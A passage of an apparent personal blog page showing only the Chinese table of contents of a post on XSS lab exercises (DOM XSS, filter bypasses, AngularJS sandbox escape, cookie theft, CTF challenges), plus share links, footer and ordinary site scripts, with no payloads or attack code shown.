href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-3"><span class="toc-number">3.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Elocation-search%E6%BA%90%E9%80%9A%E8%BF%87innerHTML%E6%8E%A5%E6%94%B6%E5%99%A8%E8%A7%A6%E5%8F%91%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.3.</span> <span class="toc-text">基于location.search源通过innerHTML接收器触发的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">实验要求:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-4"><span class="toc-number">3.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8location-search%E6%94%BB%E5%87%BBjQuery%E7%9A%84a%E6%A0%87%E7%AD%BEhref%E5%B1%9E%E6%80%A7%E5%AF%BC%E8%87%B4%E7%9A%84DOM%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.4.</span> <span class="toc-text">利用location.search攻击jQuery的a标签href属性导致的DOM型XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-4"><span class="toc-number">3.4.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-5"><span class="toc-number">3.4.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-hashchange-%E4%BA%8B%E4%BB%B6%E5%9C%A8-jQuery-%E9%80%89%E6%8B%A9%E5%99%A8%E6%8E%A5%E6%94%B6%E5%99%A8%E4%B8%AD%E8%A7%A6%E5%8F%91%E7%9A%84-DOM-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.5.</span> <span class="toc-text">利用 hashchange 事件在 jQuery 选择器接收器中触发的 DOM XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-5"><span class="toc-number">3.5.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-6"><span class="toc-number">3.5.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%B8%AD%E5%AD%98%E5%9C%A8DOM%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%EF%BC%88XSS%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81"><span class="toc-number">3.6.</span> <span class="toc-text">AngularJS表达式中存在DOM型跨站脚本（XSS）漏洞，且尖括号和双引号被HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-6"><span class="toc-number">3.6.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">3.6.2.</span> <span class="toc-text">实验过程:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.7.</span> <span class="toc-text">反射型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-7"><span class="toc-number">3.7.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-7"><span class="toc-number">3.7.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-DOM-XSS%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.8.</span> <span class="toc-text">存储型 DOM XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-8"><span class="toc-number">3.8.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-8"><span class="toc-number">3.8.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E4%B9%8B%E9%97%B4%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">HTML标签之间的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%A7%E5%A4%9A%E6%95%B0%E6%A0%87%E7%AD%BE%E5%92%8C%E5%B1%9E%E6%80%A7%E8%A2%AB%E7%A6%81%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.1.</span> <span class="toc-text">大多数标签和属性被禁止的反射型XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-1"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-1"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E4%BA%86%E6%89%80%E6%9C%89%E9%99%A4%E8%87%AA%E5%88%B6%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%A4%96%E7%9A%84%E6%89%80%E6%9C%89%E6%A0%87%E7%AD%BE%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.2.</span> <span class="toc-text">禁止了所有除自制标签以外的所有标签的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-2"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-2"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%80%E6%9C%89%E4%BA%8B%E4%BB%B6%E5%92%8C-href-%E5%B1%9E%E6%80%A7%E5%9D%87%E8%A2%AB%E9%98%BB%E6%AD%A2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS"><span class="toc-number">4.1.3.</span> <span class="toc-text">所有事件和 href 属性均被阻止的反射型 XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-3"><span class="toc-number">4.1.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-3"><span class="toc-number">4.1.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%81%E8%AE%B8%E9%83%A8%E5%88%86SVG%E6%A0%87%E8%AE%B0%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">4.1.4.</span> <span class="toc-text">允许部分SVG标记的反射型XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-4"><span class="toc-number">4.1.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-4"><span class="toc-number">4.1.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.2.</span> <span class="toc-text">HTML标签属性中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E2%80%94%E2%80%94%E6%B3%A8%E5%85%A5HTML%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="toc-number">4.2.1.</span> <span class="toc-text">反射型XSS——注入HTML标签属性（尖括号被HTML编码的情况）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-5"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-5"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E2%80%94%E2%80%94%E5%88%A9%E7%94%A8%E9%94%9A%E7%82%B9href%E5%B1%9E%E6%80%A7%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%ABHTML%E7%BC%96%E7%A0%81%EF%BC%89"><span class="toc-number">4.2.2.</span> <span class="toc-text">存储型XSS——利用锚点href属性注入（双引号被HTML编码）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-9"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-9"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Canonical-%E9%93%BE%E6%8E%A5%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.3.</span> <span class="toc-text">Canonical 链接标签中的反射型 XSS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82%EF%BC%9A-10"><span class="toc-number">4.2.3.1.</span> <span class="toc-text">实验要求：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B%EF%BC%9A-10"><span class="toc-number">4.2.3.2.</span> <span class="toc-text">实验过程：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E4%B8%8A%E4%B8%8B%E6%96%87%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">JavaScript上下文中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%A2%AB%E8%BD%AC%E4%B9%89%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%88%E5%B5%8C%E5%85%A5JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8A%E4%B8%8B%E6%96%87%EF%BC%89"><span class="toc-number">4.3.1.</span> <span class="toc-text">单引号和反斜杠被转义情况下的反射型XSS攻击（嵌入JavaScript字符串上下文）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-6"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-6"><span class="toc-number">4.3.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B3%A8%E5%85%A5%E5%88%B0JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%EF%BC%8C%E4%B8%94%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%B7%B2HTML%E7%BC%96%E7%A0%81"><span class="toc-number">4.3.2.</span> <span class="toc-text">反射型XSS注入到JavaScript字符串中，且尖括号已HTML编码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-7"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-7"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%9A%E6%B3%A8%E5%85%A5%E7%BB%8F%E8%BF%87HTML%E7%BC%96%E7%A0%81%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%89%E4%B8%94%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BD%AC%E4%B9%89%E7%9A%84JavaScript%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%8E%AF%E5%A2%83"><span class="toc-number">4.3.3.</span> <span class="toc-text">反射型XSS攻击：注入经过HTML编码（尖括号和双引号）且单引号被转义的JavaScript字符串环境</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-8"><span class="toc-number">4.3.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-8"><span class="toc-number">4.3.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%EF%BC%9AJavaScript-URL%E4%B8%AD%E9%83%A8%E5%88%86%E5%AD%97%E7%AC%A6%E8%A2%AB%E6%8B%A6%E6%88%AA%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">4.3.4.</span> <span class="toc-text">反射型XSS：JavaScript URL中部分字符被拦截的情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-9"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-9"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML%E5%AE%9E%E4%BD%93%E7%BC%96%E7%A0%81"><span class="toc-number">4.4.</span> <span class="toc-text">HTML实体编码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%EF%BC%8C%E6%B3%A8%E5%85%A5%E5%88%B0onclick%E4%BA%8B%E4%BB%B6%E4%B8%AD%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%B0%96%E6%8B%AC%E5%8F%B7%EF%BC%88%EF%BC%89%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%EF%BC%88%E2%80%9D%EF%BC%89%E8%A2%ABHTML%E7%BC%96%E7%A0%81%EF%BC%8C%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%88%E2%80%99%EF%BC%89%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%EF%BC%88-%EF%BC%89%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">4.4.1.</span> <span class="toc-text">存储型XSS攻击，注入到onclick事件中，其中尖括号（&lt;&gt;）和双引号（”）被HTML编码，单引号（’）和反斜杠（\）被转义</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-10"><span class="toc-number">4.4.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-10"><span class="toc-number">4.4.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84XSS%E6%94%BB%E5%87%BB"><span class="toc-number">4.5.</span> <span class="toc-text">JavaScript模板字符串中的XSS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%B3%A8%E5%85%A5%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%88%E5%B0%96%E6%8B%AC%E5%8F%B7%E3%80%81%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E3%80%81%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E5%8F%8D%E5%BC%95%E5%8F%B7%E5%9D%87%E8%A2%ABUnicode%E8%BD%AC%E4%B9%89%EF%BC%89"><span class="toc-number">4.5.1.</span> <span class="toc-text">反射型XSS注入模板字符串（尖括号、单双引号、反斜杠和反引号均被Unicode转义）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-11"><span class="toc-number">4.5.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-11"><span class="toc-number">4.5.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AngularJS%E7%9A%84%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">AngularJS的沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84AngularJS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%94%BB%E5%87%BB"><span class="toc-number">5.1.</span> <span class="toc-text">无字符串的AngularJS沙箱逃逸攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-12"><span class="toc-number">5.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-12"><span class="toc-number">5.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">XSS漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS%E7%AA%83%E5%8F%96Cookie"><span class="toc-number">6.1.</span> <span class="toc-text">利用XSS窃取Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-13"><span class="toc-number">6.1.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-13"><span class="toc-number">6.1.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XSS%E6%BC%8F%E6%B4%9E%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81"><span class="toc-number">6.2.</span> <span class="toc-text">利用XSS漏洞获取密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-14"><span class="toc-number">6.2.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-14"><span class="toc-number">6.2.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-XSS-%E7%BB%95%E8%BF%87-CSRF-%E9%98%B2%E5%BE%A1"><span class="toc-number">6.3.</span> <span class="toc-text">利用 XSS 绕过 CSRF 防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%A6%81%E6%B1%82-15"><span class="toc-number">6.3.1.</span> <span class="toc-text">实验要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B-15"><span class="toc-number">6.3.2.</span> <span class="toc-text">实验过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AFCTF-2021-BABY-CSP"><span class="toc-number">7.</span> <span class="toc-text">[AFCTF 2021]BABY_CSP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSSRound-18-Basic-%E9%97%A8%E9%85%B1%E6%83%B3%E7%8E%A9%E4%BB%80%E4%B9%88%E5%91%A2%EF%BC%9F"><span class="toc-number">8.</span> <span class="toc-text">[NSSRound#18 Basic]门酱想玩什么呢？</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://21346asz.github.io/XSS/XSS/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://21346asz.github.io/XSS/XSS/&text=XSS"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://21346asz.github.io/XSS/XSS/&is_video=false&description=XSS"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=XSS&body=Check out this article: https://21346asz.github.io/XSS/XSS/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://21346asz.github.io/XSS/XSS/&title=XSS"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://21346asz.github.io/XSS/XSS/&name=XSS&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://21346asz.github.io/XSS/XSS/&t=XSS"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2025
        wArn
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">Home</a></li><!--
        --><!--
          --><li><a href="/about/">About</a></li><!--
        --><!--
          --><li><a href="/categories/">categories</a></li><!--
        --><!--
          --><li><a href="/tags/">tags</a></li><!--
        --><!--
          --><li><a href="/search/">Search</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
                  <script defer src="https://cn.vercount.one/js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

<!-- Waline Comments -->

  <script type="module">
    import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';

    var EMOJI = ['//unpkg.com/@waline/emojis@1.2.0/weibo']
    var META = ['nick', 'mail', 'link'];
    var REQUIREDFIELDS = ['nick', 'mail', 'link'];

